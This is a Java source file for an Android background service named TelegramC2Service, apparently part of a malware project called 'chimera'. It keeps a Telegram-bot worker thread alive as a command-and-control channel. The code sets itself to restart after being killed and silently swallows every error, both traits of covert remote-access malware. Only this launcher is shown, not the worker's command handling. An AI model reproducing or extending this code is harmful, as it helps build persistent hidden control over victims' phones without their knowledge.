package com.chimera;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;

public class TelegramC2Service extends Service {
    private Thread workerThread;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
        } catch (Exception e) {}
        try {
            startWorker();
        } catch (Exception e) {}
    }

    private void startWorker() {
        try {
            if (workerThread == null || !workerThread.isAlive()) {
                workerThread = new Thread(new TelegramBotWorker(this));
                workerThread.start();
            }
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startWorker();
        } catch (Exception e) {}
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        try {
            if (workerThread != null) {
                workerThread.interrupt();
            }
        } catch (Exception e) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}